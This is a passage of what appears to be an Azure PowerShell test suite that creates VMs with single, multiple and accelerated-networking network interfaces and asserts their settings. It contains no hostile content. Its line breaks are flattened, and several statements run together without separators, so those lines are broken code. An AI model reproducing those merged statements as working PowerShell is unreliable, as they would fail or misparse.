function Test-SingleNetworkInterface{$rgname = Get-ComputeTestResourceNametry{$loc = Get-ComputeVMLocation;New-AzResourceGroup -Name $rgname -Location $loc -Force;$vmsize = 'Standard_A2';$vmname = 'vm' + $rgname;$p = New-AzVMConfig -VMName $vmname -VMSize $vmsize;Assert-AreEqual $p.HardwareProfile.VmSize $vmsize;$subnet = New-AzVirtualNetworkSubnetConfig -Name ('subnet' + $rgname) -AddressPrefix "10.0.0.0/24";$vnet = New-AzVirtualNetwork -Force -Name ('vnet' + $rgname) -ResourceGroupName $rgname -Location $loc -AddressPrefix "10.0.0.0/16" -Subnet $subnet;$vnet = Get-AzVirtualNetwork -Name ('vnet' + $rgname) -ResourceGroupName $rgname;$subnetId = $vnet.Subnets[0].Id;$pubip = New-AzPublicIpAddress -Force -Name ('pubip' + $rgname) -ResourceGroupName $rgname -Location $loc -AllocationMethod Dynamic -DomainNameLabel ('pubip' + $rgname);$pubip = Get-AzPublicIpAddress -Name ('pubip' + $rgname) -ResourceGroupName $rgname;$pubipId = $pubip.Id;$nic = New-AzNetworkInterface -Force -Name ('nic' + $rgname) -ResourceGroupName $rgname -Location $loc -SubnetId $subnetId -PublicIpAddressId $pubip.Id;$nic = Get-AzNetworkInterface -Name ('nic' + $rgname) -ResourceGroupName $rgname;$nicId = $nic.Id;$p = Add-AzVMNetworkInterface -VM $p -Id $nicId;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces.Count 1;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces[0].Id $nicId;Assert-Null $p.NetworkProfile.NetworkInterfaces[0].Primary;$stoname = 'sto' + $rgname;$stotype = 'Standard_GRS';New-AzStorageAccount -ResourceGroupName $rgname -Name $stoname -Location $loc -Type $stotype;$stoaccount = Get-AzStorageAccount -ResourceGroupName $rgname -Name $stoname;$osDiskName = 'osDisk';$osDiskCaching = 'ReadWrite';$osDiskVhdUri = "https://$stoname.blob.core.windows.net/test/os.vhd";$dataDiskVhdUri1 = "https://$stoname.blob.core.windows.net/test/data1.vhd";$dataDiskVhdUri2 = "https://$stoname.blob.core.windows.net/test/data2.vhd";$dataDiskVhdUri3 = "https://$stoname.blob.core.windows.net/test/data3.vhd";$p = Set-AzVMOSDisk -VM $p -Name $osDiskName -VhdUri $osDiskVhdUri -Caching $osDiskCaching -CreateOption FromImage;$p = Add-AzVMDataDisk -VM $p -Name 'testDataDisk1' -Caching 'ReadOnly' -DiskSizeInGB 10 -Lun 1 -VhdUri $dataDiskVhdUri1 -CreateOption Empty;$p = Add-AzVMDataDisk -VM $p -Name 'testDataDisk2' -Caching 'ReadOnly' -DiskSizeInGB 11 -Lun 2 -VhdUri $dataDiskVhdUri2 -CreateOption Empty;$p = Add-AzVMDataDisk -VM $p -Name 'testDataDisk3' -Caching 'ReadOnly' -DiskSizeInGB 12 -Lun 3 -VhdUri $dataDiskVhdUri3 -CreateOption Empty;$p = Remove-AzVMDataDisk -VM $p -Name 'testDataDisk3';Assert-AreEqual $p.StorageProfile.OSDisk.Caching $osDiskCaching;Assert-AreEqual $p.StorageProfile.OSDisk.Name $osDiskName;Assert-AreEqual $p.StorageProfile.OSDisk.Vhd.Uri $osDiskVhdUri;Assert-AreEqual $p.StorageProfile.DataDisks.Count 2;Assert-AreEqual $p.StorageProfile.DataDisks[0].Caching 'ReadOnly';Assert-AreEqual $p.StorageProfile.DataDisks[0].DiskSizeGB 10;Assert-AreEqual $p.StorageProfile.DataDisks[0].Lun 1;Assert-AreEqual $p.StorageProfile.DataDisks[0].Vhd.Uri $dataDiskVhdUri1;Assert-AreEqual $p.StorageProfile.DataDisks[1].Caching 'ReadOnly';Assert-AreEqual $p.StorageProfile.DataDisks[1].DiskSizeGB 11;Assert-AreEqual $p.StorageProfile.DataDisks[1].Lun 2;Assert-AreEqual $p.StorageProfile.DataDisks[1].Vhd.Uri $dataDiskVhdUri2;$user = "Foo12";$password = $PLACEHOLDER;$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$cred = New-Object System.Management.Automation.PSCredential ($user, $securePassword);$computerName = 'test';$vhdContainer = "https://$stoname.blob.core.windows.net/test";$img = 'a699494373c04fc0bc8f2bb1389d6106__Windows-Server-2012-Datacenter-201503.01-en.us-127GB.vhd';$p = Set-AzVMOperatingSystem -VM $p -Windows -ComputerName $computerName -Credential $cred;Assert-AreEqual $p.OSProfile.AdminUsername $user;Assert-AreEqual $p.OSProfile.ComputerName $computerName;Assert-AreEqual $p.OSProfile.AdminPassword $password;$imgRef = Get-DefaultCRPImage;$p = ($imgRef | Set-AzVMSourceImage -VM $p);Assert-NotNull $p.StorageProfile.ImageReference;Assert-Null $p.StorageProfile.SourceImageId;$p.StorageProfile.DataDisks = $null;New-AzVM -ResourceGroupName $rgname -Location $loc -VM $p;$vm1 = Get-AzVM -Name $vmname -ResourceGroupName $rgname;Assert-AreEqual $vm1.Name $vmname;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces.Count 1;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces[0].Id $nicId;$getnic = Get-AzNetworkInterface -Name ('nic' + $rgname) -ResourceGroupName $rgname;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces[0].Id $getnic.Id;Assert-AreEqual $getnic.Primary true;Assert-NotNull $getnic.MacAddress;Remove-AzVM -Name $vmname -ResourceGroupName $rgname -Force;}finally{Clean-ResourceGroup $rgname}}function Test-SingleNetworkInterfaceDnsSettings{$rgname = Get-ComputeTestResourceNametry{$loc = Get-ComputeVMLocation;New-AzResourceGroup -Name $rgname -Location $loc -Force;$vmsize = 'Standard_A2';$vmname = 'vm' + $rgname;$p = New-AzVMConfig -VMName $vmname -VMSize $vmsize;Assert-AreEqual $p.HardwareProfile.VmSize $vmsize;$subnet = New-AzVirtualNetworkSubnetConfig -Name ('subnet' + $rgname) -AddressPrefix "10.0.0.0/24";$vnet = New-AzVirtualNetwork -Force -Name ('vnet' + $rgname) -ResourceGroupName $rgname -Location $loc -AddressPrefix "10.0.0.0/16" -Subnet $subnet;$vnet = Get-AzVirtualNetwork -Name ('vnet' + $rgname) -ResourceGroupName $rgname;$subnetId = $vnet.Subnets[0].Id;$pubip = New-AzPublicIpAddress -Force -Name ('pubip' + $rgname) -ResourceGroupName $rgname -Location $loc -AllocationMethod Dynamic -DomainNameLabel ('pubip' + $rgname);$pubip = Get-AzPublicIpAddress -Name ('pubip' + $rgname) -ResourceGroupName $rgname;$pubipId = $pubip.Id;$nic = New-AzNetworkInterface -Force -Name ('nic' + $rgname) -ResourceGroupName $rgname -Location $loc -SubnetId $subnetId -PublicIpAddressId $pubip.Id -DnsServer "8.8.8.8";$nic = Get-AzNetworkInterface -Name ('nic' + $rgname) -ResourceGroupName $rgname;$nicId = $nic.Id;$p = Add-AzVMNetworkInterface -VM $p -Id $nicId;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces.Count 1;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces[0].Id $nicId;Assert-Null $p.NetworkProfile.NetworkInterfaces[0].Primary;$stoname = 'sto' + $rgname;$stotype = 'Standard_GRS';New-AzStorageAccount -ResourceGroupName $rgname -Name $stoname -Location $loc -Type $stotype;$stoaccount = Get-AzStorageAccount -ResourceGroupName $rgname -Name $stoname;$osDiskName = 'osDisk';$osDiskCaching = 'ReadWrite';$osDiskVhdUri = "https://$stoname.blob.core.windows.net/test/os.vhd";$dataDiskVhdUri1 = "https://$stoname.blob.core.windows.net/test/data1.vhd";$dataDiskVhdUri2 = "https://$stoname.blob.core.windows.net/test/data2.vhd";$dataDiskVhdUri3 = "https://$stoname.blob.core.windows.net/test/data3.vhd";$p = Set-AzVMOSDisk -VM $p -Name $osDiskName -VhdUri $osDiskVhdUri -Caching $osDiskCaching -CreateOption FromImage;$p = Add-AzVMDataDisk -VM $p -Name 'testDataDisk1' -Caching 'ReadOnly' -DiskSizeInGB 10 -Lun 1 -VhdUri $dataDiskVhdUri1 -CreateOption Empty;$p = Add-AzVMDataDisk -VM $p -Name 'testDataDisk2' -Caching 'ReadOnly' -DiskSizeInGB 11 -Lun 2 -VhdUri $dataDiskVhdUri2 -CreateOption Empty;$p = Add-AzVMDataDisk -VM $p -Name 'testDataDisk3' -Caching 'ReadOnly' -DiskSizeInGB 12 -Lun 3 -VhdUri $dataDiskVhdUri3 -CreateOption Empty;$p = Remove-AzVMDataDisk -VM $p -Name 'testDataDisk3';$user = "Foo12";$password = $PLACEHOLDER;$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$cred = New-Object System.Management.Automation.PSCredential ($user, $securePassword);$computerName = 'test';$vhdContainer = "https://$stoname.blob.core.windows.net/test";$img = 'a699494373c04fc0bc8f2bb1389d6106__Windows-Server-2012-Datacenter-201503.01-en.us-127GB.vhd';$p = Set-AzVMOperatingSystem -VM $p -Windows -ComputerName $computerName -Credential $cred;$imgRef = Get-DefaultCRPImage;$p = ($imgRef | Set-AzVMSourceImage -VM $p);Assert-NotNull $p.StorageProfile.ImageReference;Assert-Null $p.StorageProfile.SourceImageId;$p.StorageProfile.DataDisks = $null;New-AzVM -ResourceGroupName $rgname -Location $loc -VM $p;$vm1 = Get-AzVM -Name $vmname -ResourceGroupName $rgname;Assert-AreEqual $vm1.Name $vmname;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces.Count 1;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces[0].Id $nicId;$getnic = Get-AzNetworkInterface -Name ('nic' + $rgname) -ResourceGroupName $rgname;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces[0].Id $getnic.Id;Assert-AreEqual $getnic.Primary true;Assert-NotNull $getnic.MacAddress;Assert-NotNull $getnic.DnsSettings.AppliedDnsServers;Remove-AzVM -Name $vmname -ResourceGroupName $rgname -Force;}finally{Clean-ResourceGroup $rgname}}function Test-MultipleNetworkInterface{$rgname = Get-ComputeTestResourceNametry{$loc = Get-ComputeVMLocation;New-AzResourceGroup -Name $rgname -Location $loc -Force;$vmsize = 'Standard_A4';$vmname = 'vm' + $rgname;$p = New-AzVMConfig -VMName $vmname -VMSize $vmsize;Assert-AreEqual $p.HardwareProfile.VmSize $vmsize;$subnet = New-AzVirtualNetworkSubnetConfig -Name ('subnet' + $rgname) -AddressPrefix "10.0.0.0/24";$vnet = New-AzVirtualNetwork -Force -Name ('vnet' + $rgname) -ResourceGroupName $rgname -Location $loc -AddressPrefix "10.0.0.0/16" -Subnet $subnet;$vnet = Get-AzVirtualNetwork -Name ('vnet' + $rgname) -ResourceGroupName $rgname;$subnetId = $vnet.Subnets[0].Id;$nic1 = New-AzNetworkInterface -Force -Name ('nic1' + $rgname) -ResourceGroupName $rgname -Location $loc -SubnetId $subnetId;$nic2 = New-AzNetworkInterface -Force -Name ('nic2' + $rgname) -ResourceGroupName $rgname -Location $loc -SubnetId $subnetId;$p = Add-AzVMNetworkInterface -VM $p -Id $nic1.Id;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces.Count 1;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces[0].Id $nic1.Id;Assert-Null $p.NetworkProfile.NetworkInterfaces[0].Primary;$p = Add-AzVMNetworkInterface -VM $p -Id $nic2.Id -Primary;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces.Count 2;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces[1].Id $nic2.Id;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces[1].Primary true;Assert-AreNotEqual $p.NetworkProfile.NetworkInterfaces[0].Primary true;$stoname = 'sto' + $rgname;$stotype = 'Standard_GRS';New-AzStorageAccount -ResourceGroupName $rgname -Name $stoname -Location $loc -Type $stotype;$stoaccount = Get-AzStorageAccount -ResourceGroupName $rgname -Name $stoname;$osDiskName = 'osDisk';$osDiskCaching = 'ReadWrite';$osDiskVhdUri = "https://$stoname.blob.core.windows.net/test/os.vhd";$dataDiskVhdUri1 = "https://$stoname.blob.core.windows.net/test/data1.vhd";$dataDiskVhdUri2 = "https://$stoname.blob.core.windows.net/test/data2.vhd";$dataDiskVhdUri3 = "https://$stoname.blob.core.windows.net/test/data3.vhd";$p = Set-AzVMOSDisk -VM $p -Name $osDiskName -VhdUri $osDiskVhdUri -Caching $osDiskCaching -CreateOption FromImage;$p = Add-AzVMDataDisk -VM $p -Name 'testDataDisk1' -Caching 'ReadOnly' -DiskSizeInGB 10 -Lun 1 -VhdUri $dataDiskVhdUri1 -CreateOption Empty;$p = Add-AzVMDataDisk -VM $p -Name 'testDataDisk2' -Caching 'ReadOnly' -DiskSizeInGB 11 -Lun 2 -VhdUri $dataDiskVhdUri2 -CreateOption Empty;$p = Add-AzVMDataDisk -VM $p -Name 'testDataDisk3' -Caching 'ReadOnly' -DiskSizeInGB 12 -Lun 3 -VhdUri $dataDiskVhdUri3 -CreateOption Empty;$p = Remove-AzVMDataDisk -VM $p -Name 'testDataDisk3';$user = "Foo12";$password = $PLACEHOLDER;$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$cred = New-Object System.Management.Automation.PSCredential ($user, $securePassword);$computerName = 'test';$vhdContainer = "https://$stoname.blob.core.windows.net/test";$img = 'a699494373c04fc0bc8f2bb1389d6106__Windows-Server-2012-Datacenter-201503.01-en.us-127GB.vhd';$p = Set-AzVMOperatingSystem -VM $p -Windows -ComputerName $computerName -Credential $cred;$imgRef = Get-DefaultCRPImage;$p = ($imgRef | Set-AzVMSourceImage -VM $p);Assert-NotNull $p.StorageProfile.ImageReference;Assert-Null $p.StorageProfile.SourceImageId;$p.StorageProfile.DataDisks = $null;New-AzVM -ResourceGroupName $rgname -Location $loc -VM $p;$vm1 = Get-AzVM -Name $vmname -ResourceGroupName $rgname;Assert-AreEqual $vm1.Name $vmname;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces.Count 2;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces[0].Id $nic1.Id;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces[1].Id $nic2.Id;$getnic1 = Get-AzNetworkInterface -Name ('nic1' + $rgname) -ResourceGroupName $rgname;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces[0].Id $getnic1.Id;Assert-AreNotEqual  $getnic1.Primary true;Assert-NotNull $getnic1.MacAddress;$getnic2 = Get-AzNetworkInterface -Name ('nic2' + $rgname) -ResourceGroupName $rgname;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces[1].Id $getnic2.Id;Assert-AreEqual $getnic2.Primary true;Assert-NotNull $getnic2.MacAddress;Remove-AzVM -Name $vmname -ResourceGroupName $rgname -Force;}finally{Clean-ResourceGroup $rgname}}function Test-AddNetworkInterface{$rgname = Get-ComputeTestResourceNametry{$loc = Get-ComputeVMLocation;New-AzResourceGroup -Name $rgname -Location $loc -Force;$vmsize = 'Standard_A2';$vmname = 'vm' + $rgname;$p = New-AzVMConfig -VMName $vmname -VMSize $vmsize;Assert-AreEqual $p.HardwareProfile.VmSize $vmsize;$subnet = New-AzVirtualNetworkSubnetConfig -Name ('subnet' + $rgname) -AddressPrefix "10.0.0.0/24";$vnet = New-AzVirtualNetwork -Force -Name ('vnet' + $rgname) -ResourceGroupName $rgname -Location $loc -AddressPrefix "10.0.0.0/16" -Subnet $subnet;$vnet = Get-AzVirtualNetwork -Name ('vnet' + $rgname) -ResourceGroupName $rgname;$subnetId = $vnet.Subnets[0].Id;$pubip = New-AzPublicIpAddress -Force -Name ('pubip' + $rgname) -ResourceGroupName $rgname -Location $loc -AllocationMethod Dynamic -DomainNameLabel ('pubip' + $rgname);$pubip = Get-AzPublicIpAddress -Name ('pubip' + $rgname) -ResourceGroupName $rgname;$pubipId = $pubip.Id;$nic = New-AzNetworkInterface -Force -Name ('nic' + $rgname) -ResourceGroupName $rgname -Location $loc -SubnetId $subnetId -PublicIpAddressId $pubip.Id;$nicId = $nic.Id;$nicList = Get-AzNetworkInterface -ResourceGroupName $rgname;$nicList[0].Primary = $true;$p = Add-AzVMNetworkInterface -VM $p -NetworkInterface $nicList;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces.Count 1;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces[0].Id $nicList[0].Id;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces[0].Primary $true;$stoname = 'sto' + $rgname;$stotype = 'Standard_GRS';New-AzStorageAccount -ResourceGroupName $rgname -Name $stoname -Location $loc -Type $stotype;$stoaccount = Get-AzStorageAccount -ResourceGroupName $rgname -Name $stoname;$osDiskName = 'osDisk';$osDiskCaching = 'ReadWrite';$osDiskVhdUri = "https://$stoname.blob.core.windows.net/test/os.vhd";$dataDiskVhdUri1 = "https://$stoname.blob.core.windows.net/test/data1.vhd";$dataDiskVhdUri2 = "https://$stoname.blob.core.windows.net/test/data2.vhd";$dataDiskVhdUri3 = "https://$stoname.blob.core.windows.net/test/data3.vhd";$p = Set-AzVMOSDisk -VM $p -Name $osDiskName -VhdUri $osDiskVhdUri -Caching $osDiskCaching -CreateOption FromImage;$p = Add-AzVMDataDisk -VM $p -Name 'testDataDisk1' -Caching 'ReadOnly' -DiskSizeInGB 10 -Lun 1 -VhdUri $dataDiskVhdUri1 -CreateOption Empty;$p = Add-AzVMDataDisk -VM $p -Name 'testDataDisk2' -Caching 'ReadOnly' -DiskSizeInGB 11 -Lun 2 -VhdUri $dataDiskVhdUri2 -CreateOption Empty;Assert-AreEqual $p.StorageProfile.OSDisk.Caching $osDiskCaching;Assert-AreEqual $p.StorageProfile.OSDisk.Name $osDiskName;Assert-AreEqual $p.StorageProfile.OSDisk.Vhd.Uri $osDiskVhdUri;Assert-AreEqual $p.StorageProfile.DataDisks.Count 2;Assert-AreEqual $p.StorageProfile.DataDisks[0].Caching 'ReadOnly';Assert-AreEqual $p.StorageProfile.DataDisks[0].DiskSizeGB 10;Assert-AreEqual $p.StorageProfile.DataDisks[0].Lun 1;Assert-AreEqual $p.StorageProfile.DataDisks[0].Vhd.Uri $dataDiskVhdUri1;Assert-AreEqual $p.StorageProfile.DataDisks[1].Caching 'ReadOnly';Assert-AreEqual $p.StorageProfile.DataDisks[1].DiskSizeGB 11;Assert-AreEqual $p.StorageProfile.DataDisks[1].Lun 2;Assert-AreEqual $p.StorageProfile.DataDisks[1].Vhd.Uri $dataDiskVhdUri2;$user = "Foo12";$password = $PLACEHOLDER;$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$cred = New-Object System.Management.Automation.PSCredential ($user, $securePassword);$computerName = 'test';$p = Set-AzVMOperatingSystem -VM $p -Windows -ComputerName $computerName -Credential $cred;Assert-AreEqual $p.OSProfile.AdminUsername $user;Assert-AreEqual $p.OSProfile.ComputerName $computerName;Assert-AreEqual $p.OSProfile.AdminPassword $password;$imgRef = Get-DefaultCRPImage;$p = ($imgRef | Set-AzVMSourceImage -VM $p);Assert-NotNull $p.StorageProfile.ImageReference;Assert-Null $p.StorageProfile.SourceImageId;$p.StorageProfile.DataDisks = $null;New-AzVM -ResourceGroupName $rgname -Location $loc -VM $p;$vm1 = Get-AzVM -Name $vmname -ResourceGroupName $rgname;Assert-AreEqual $vm1.Name $vmname;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces.Count 1;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces[0].Id $nicId;}finally{Clean-ResourceGroup $rgname}}function Test-EffectiveRoutesAndNsg{$rgname = Get-ComputeTestResourceNametry{$loc = Get-ComputeVMLocation;New-AzResourceGroup -Name $rgname -Location $loc -Force;$vmsize = 'Standard_A2';$vmname = 'vm' + $rgname;$p = New-AzVMConfig -VMName $vmname -VMSize $vmsize;Assert-AreEqual $p.HardwareProfile.VmSize $vmsize;$subnet = New-AzVirtualNetworkSubnetConfig -Name ('subnet' + $rgname) -AddressPrefix "10.0.0.0/24";$vnet = New-AzVirtualNetwork -Force -Name ('vnet' + $rgname) -ResourceGroupName $rgname -Location $loc -AddressPrefix "10.0.0.0/16" -Subnet $subnet;$vnet = Get-AzVirtualNetwork -Name ('vnet' + $rgname) -ResourceGroupName $rgname;$subnetId = $vnet.Subnets[0].Id;$pubip = New-AzPublicIpAddress -Force -Name ('pubip' + $rgname) -ResourceGroupName $rgname -Location $loc -AllocationMethod Dynamic -DomainNameLabel ('pubip' + $rgname);$pubip = Get-AzPublicIpAddress -Name ('pubip' + $rgname) -ResourceGroupName $rgname;$pubipId = $pubip.Id;$nsg = New-AzNetworkSecurityGroup -Force -Name ('nsg' + $rgname) -ResourceGroupName $rgname -Location $loc$nsgId = $nsg.Id$nic = New-AzNetworkInterface -Force -Name ('nic' + $rgname) -ResourceGroupName $rgname -Location $loc -SubnetId $subnetId -PublicIpAddressId $pubip.Id -NetworkSecurityGroupId $nsgId;$nic = Get-AzNetworkInterface -Name ('nic' + $rgname) -ResourceGroupName $rgname;$nicId = $nic.Id;$p = Add-AzVMNetworkInterface -VM $p -Id $nicId;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces.Count 1;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces[0].Id $nicId;Assert-Null $p.NetworkProfile.NetworkInterfaces[0].Primary;$stoname = 'sto' + $rgname;$stotype = 'Standard_GRS';New-AzStorageAccount -ResourceGroupName $rgname -Name $stoname -Location $loc -Type $stotype;$stoaccount = Get-AzStorageAccount -ResourceGroupName $rgname -Name $stoname;$osDiskName = 'osDisk';$osDiskCaching = 'ReadWrite';$osDiskVhdUri = "https://$stoname.blob.core.windows.net/test/os.vhd";$dataDiskVhdUri1 = "https://$stoname.blob.core.windows.net/test/data1.vhd";$dataDiskVhdUri2 = "https://$stoname.blob.core.windows.net/test/data2.vhd";$dataDiskVhdUri3 = "https://$stoname.blob.core.windows.net/test/data3.vhd";$p = Set-AzVMOSDisk -VM $p -Name $osDiskName -VhdUri $osDiskVhdUri -Caching $osDiskCaching -CreateOption FromImage;$p = Add-AzVMDataDisk -VM $p -Name 'testDataDisk1' -Caching 'ReadOnly' -DiskSizeInGB 10 -Lun 1 -VhdUri $dataDiskVhdUri1 -CreateOption Empty;$p = Add-AzVMDataDisk -VM $p -Name 'testDataDisk2' -Caching 'ReadOnly' -DiskSizeInGB 11 -Lun 2 -VhdUri $dataDiskVhdUri2 -CreateOption Empty;$p = Add-AzVMDataDisk -VM $p -Name 'testDataDisk3' -Caching 'ReadOnly' -DiskSizeInGB 12 -Lun 3 -VhdUri $dataDiskVhdUri3 -CreateOption Empty;$p = Remove-AzVMDataDisk -VM $p -Name 'testDataDisk3';Assert-AreEqual $p.StorageProfile.OSDisk.Caching $osDiskCaching;Assert-AreEqual $p.StorageProfile.OSDisk.Name $osDiskName;Assert-AreEqual $p.StorageProfile.OSDisk.Vhd.Uri $osDiskVhdUri;Assert-AreEqual $p.StorageProfile.DataDisks.Count 2;Assert-AreEqual $p.StorageProfile.DataDisks[0].Caching 'ReadOnly';Assert-AreEqual $p.StorageProfile.DataDisks[0].DiskSizeGB 10;Assert-AreEqual $p.StorageProfile.DataDisks[0].Lun 1;Assert-AreEqual $p.StorageProfile.DataDisks[0].Vhd.Uri $dataDiskVhdUri1;Assert-AreEqual $p.StorageProfile.DataDisks[1].Caching 'ReadOnly';Assert-AreEqual $p.StorageProfile.DataDisks[1].DiskSizeGB 11;Assert-AreEqual $p.StorageProfile.DataDisks[1].Lun 2;Assert-AreEqual $p.StorageProfile.DataDisks[1].Vhd.Uri $dataDiskVhdUri2;$user = "Foo12";$password = $PLACEHOLDER;$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$cred = New-Object System.Management.Automation.PSCredential ($user, $securePassword);$computerName = 'test';$vhdContainer = "https://$stoname.blob.core.windows.net/test";$img = 'a699494373c04fc0bc8f2bb1389d6106__Windows-Server-2012-Datacenter-201503.01-en.us-127GB.vhd';$p = Set-AzVMOperatingSystem -VM $p -Windows -ComputerName $computerName -Credential $cred;Assert-AreEqual $p.OSProfile.AdminUsername $user;Assert-AreEqual $p.OSProfile.ComputerName $computerName;Assert-AreEqual $p.OSProfile.AdminPassword $password;$imgRef = Get-DefaultCRPImage;$p = ($imgRef | Set-AzVMSourceImage -VM $p);Assert-NotNull $p.StorageProfile.ImageReference;Assert-Null $p.StorageProfile.SourceImageId;$p.StorageProfile.DataDisks = $null;New-AzVM -ResourceGroupName $rgname -Location $loc -VM $p;$vm1 = Get-AzVM -Name $vmname -ResourceGroupName $rgname;Assert-AreEqual $vm1.Name $vmname;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces.Count 1;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces[0].Id $nicId;$getnic = Get-AzNetworkInterface -Name ('nic' + $rgname) -ResourceGroupName $rgname;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces[0].Id $getnic.Id;Assert-AreEqual $getnic.Primary true;Assert-NotNull $getnic.MacAddress;$job = Get-AzEffectiveRouteTable -ResourceGroupName $rgname -NetworkInterfaceName $getnic.Name -AsJob;$result = $job | Wait-Job;Assert-AreEqual "Completed" $result.State;$effectiveRoute = $job | Receive-JobAssert-NotNull $effectiveRoute[0].Source$effectiveNsgs = Get-AzEffectiveNetworkSecurityGroup -ResourceGroupName $rgname -NetworkInterfaceName $getnic.Name }finally{Clean-ResourceGroup $rgname}}function Test-SingleNetworkInterfaceWithAcceleratedNetworking{$rgname = Get-ComputeTestResourceNametry{[string]$loc = Get-ComputeVMLocation;$loc = $loc.Replace(' ', '');New-AzResourceGroup -Name $rgname -Location $loc -Force;$vmsize = 'Standard_DS15_v2';$vmname = 'vm' + $rgname;$p = New-AzVMConfig -VMName $vmname -VMSize $vmsize;Assert-AreEqual $p.HardwareProfile.VmSize $vmsize;$subnet = New-AzVirtualNetworkSubnetConfig -Name ('subnet' + $rgname) -AddressPrefix "10.0.0.0/24";$vnet = New-AzVirtualNetwork -Force -Name ('vnet' + $rgname) -ResourceGroupName $rgname -Location $loc -AddressPrefix "10.0.0.0/16" -Subnet $subnet;$vnet = Get-AzVirtualNetwork -Name ('vnet' + $rgname) -ResourceGroupName $rgname;$subnetId = $vnet.Subnets[0].Id;$pubip = New-AzPublicIpAddress -Force -Name ('pubip' + $rgname) -ResourceGroupName $rgname -Location $loc -AllocationMethod Dynamic -DomainNameLabel ('pubip' + $rgname);$pubip = Get-AzPublicIpAddress -Name ('pubip' + $rgname) -ResourceGroupName $rgname;$pubipId = $pubip.Id;$nic = New-AzNetworkInterface -Force -Name ('nic' + $rgname) -ResourceGroupName $rgname -Location $loc -EnableAcceleratedNetworking -SubnetId $subnetId -PublicIpAddressId $pubip.Id;$nic = Get-AzNetworkInterface -Name ('nic' + $rgname) -ResourceGroupName $rgname;$nicId = $nic.Id;Assert-AreEqual $nic.EnableAcceleratedNetworking $true$p = Add-AzVMNetworkInterface -VM $p -Id $nicId;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces.Count 1;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces[0].Id $nicId;Assert-Null $p.NetworkProfile.NetworkInterfaces[0].Primary;$stoname = 'sto' + $rgname;$stotype = 'Standard_GRS';New-AzStorageAccount -ResourceGroupName $rgname -Name $stoname -Location $loc -Type $stotype;$stoaccount = Get-AzStorageAccount -ResourceGroupName $rgname -Name $stoname;$osDiskName = 'osDisk';$osDiskCaching = 'ReadWrite';$osDiskVhdUri = "https://$stoname.blob.core.windows.net/test/os.vhd";$dataDiskVhdUri1 = "https://$stoname.blob.core.windows.net/test/data1.vhd";$dataDiskVhdUri2 = "https://$stoname.blob.core.windows.net/test/data2.vhd";$dataDiskVhdUri3 = "https://$stoname.blob.core.windows.net/test/data3.vhd";$p = Set-AzVMOSDisk -VM $p -Name $osDiskName -VhdUri $osDiskVhdUri -Caching $osDiskCaching -CreateOption FromImage;$p = Add-AzVMDataDisk -VM $p -Name 'testDataDisk1' -Caching 'ReadOnly' -DiskSizeInGB 10 -Lun 1 -VhdUri $dataDiskVhdUri1 -CreateOption Empty;$p = Add-AzVMDataDisk -VM $p -Name 'testDataDisk2' -Caching 'ReadOnly' -DiskSizeInGB 11 -Lun 2 -VhdUri $dataDiskVhdUri2 -CreateOption Empty;$p = Add-AzVMDataDisk -VM $p -Name 'testDataDisk3' -Caching 'ReadOnly' -DiskSizeInGB 12 -Lun 3 -VhdUri $dataDiskVhdUri3 -CreateOption Empty;$p = Remove-AzVMDataDisk -VM $p -Name 'testDataDisk3';Assert-AreEqual $p.StorageProfile.OSDisk.Caching $osDiskCaching;Assert-AreEqual $p.StorageProfile.OSDisk.Name $osDiskName;Assert-AreEqual $p.StorageProfile.OSDisk.Vhd.Uri $osDiskVhdUri;Assert-AreEqual $p.StorageProfile.DataDisks.Count 2;Assert-AreEqual $p.StorageProfile.DataDisks[0].Caching 'ReadOnly';Assert-AreEqual $p.StorageProfile.DataDisks[0].DiskSizeGB 10;Assert-AreEqual $p.StorageProfile.DataDisks[0].Lun 1;Assert-AreEqual $p.StorageProfile.DataDisks[0].Vhd.Uri $dataDiskVhdUri1;Assert-AreEqual $p.StorageProfile.DataDisks[1].Caching 'ReadOnly';Assert-AreEqual $p.StorageProfile.DataDisks[1].DiskSizeGB 11;Assert-AreEqual $p.StorageProfile.DataDisks[1].Lun 2;Assert-AreEqual $p.StorageProfile.DataDisks[1].Vhd.Uri $dataDiskVhdUri2;$user = "Foo12";$password = $PLACEHOLDER;$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$cred = New-Object System.Management.Automation.PSCredential ($user, $securePassword);$computerName = 'test';$vhdContainer = "https://$stoname.blob.core.windows.net/test";$img = 'a699494373c04fc0bc8f2bb1389d6106__Windows-Server-2012-Datacenter-201503.01-en.us-127GB.vhd';$p = Set-AzVMOperatingSystem -VM $p -Windows -ComputerName $computerName -Credential $cred;Assert-AreEqual $p.OSProfile.AdminUsername $user;Assert-AreEqual 